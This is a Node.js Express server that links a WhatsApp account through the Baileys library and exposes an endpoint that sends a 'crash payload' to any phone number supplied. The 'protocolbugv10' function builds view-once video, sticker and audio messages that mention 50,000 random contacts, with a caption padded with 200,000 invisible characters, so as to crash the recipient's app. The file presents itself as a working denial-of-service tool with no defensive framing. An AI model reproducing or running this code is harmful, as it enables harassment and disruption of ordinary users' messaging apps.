// server.js
const express = require('express');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    DisconnectReason
} = require('baileys');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// Store active sessions
const sessions = {};

// Ensure the sessions directory exists
if (!fs.existsSync('./sessions')) {
    fs.mkdirSync('./sessions');
}

const createSession = async (sessionId) => {
    const sessionFile = `sessions/${sessionId}`;
    const { state, saveCreds } = await useMultiFileAuthState(sessionFile);

    const sock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ['SPECTRE', 'Chrome', '1.0.0']
    });

    sessions[sessionId] = { sock, connectionStatus: 'connecting' };

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            sessions[sessionId].connectionStatus = 'connected';
            console.log(`Session ${sessionId} connected.`);
        } else if (connection === 'close') {
            const statusCode = (lastDisconnect.error instanceof Boom)?.output?.statusCode;
            if (statusCode !== DisconnectReason.loggedOut) {
                console.log(`Reconnecting session ${sessionId}...`);
                createSession(sessionId);
            } else {
                console.log(`Session ${sessionId} logged out.`);
                fs.rmSync(sessionFile, { recursive: true, force: true });
                delete sessions[sessionId];
            }
        }
    });

    return sock;
};

app.post('/generate-code', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
        return res.status(400).json({ success: false, message: 'Phone number is required.' });
    }

    const sessionId = Date.now().toString(); // Create a unique session ID
    const sock = await createSession(sessionId);

    try {
        await new Promise(resolve => setTimeout(resolve, 1500));
        const code = await sock.requestPairingCode(phoneNumber);
        res.json({ success: true, sessionId, code });
    } catch (error) {
        console.error('Error generating pairing code:', error);
        res.status(500).json({ success: false, message: 'Failed to generate pairing code.' });
    }
});


// The user-provided crash function, adapted for our server
async function protocolbugv10(sock, target) {
    const mentionedList = Array.from({ length: 50000 }, () => `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
    const virtex = "🔥 ZYOU KUNTUL 🔥" + "\u2060".repeat(200000);

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { mentionedJid: mentionedList }
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            mediaKeyTimestamp: "1746112211",
            isAnimated: true,
            contextInfo: { mentionedJid: mentionedList }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: virtex,
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
    const msg2 = generateWAMessageFromContent(target, { viewOnceMessage: { message: stickerMessage } }, {});
    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    // Send messages using the provided socket
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });
    await sock.relayMessage(target, msg3.message, { messageId: msg3.key.id });
}


app.post('/send-crash-message', async (req, res) => {
    const { sessionId, target } = req.body;

    if (!sessionId || !target) {
        return res.status(400).json({ success: false, message: 'Session ID and Target are required.' });
    }

    const session = sessions[sessionId];
    if (!session || session.connectionStatus !== 'connected') {
        return res.status(404).json({ success: false, message: 'Session not found or not connected.' });
    }

    const formattedTarget = `${target.replace(/\D/g, '')}@s.whatsapp.net`;

    try {
        await protocolbugv10(session.sock, formattedTarget);
        res.json({ success: true, message: 'Crash payload sent successfully!' });
    } catch (error) {
        console.error('Failed to send crash message:', error);
        res.status(500).json({ success: false, message: 'Failed to send message.' });
    }
});


app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
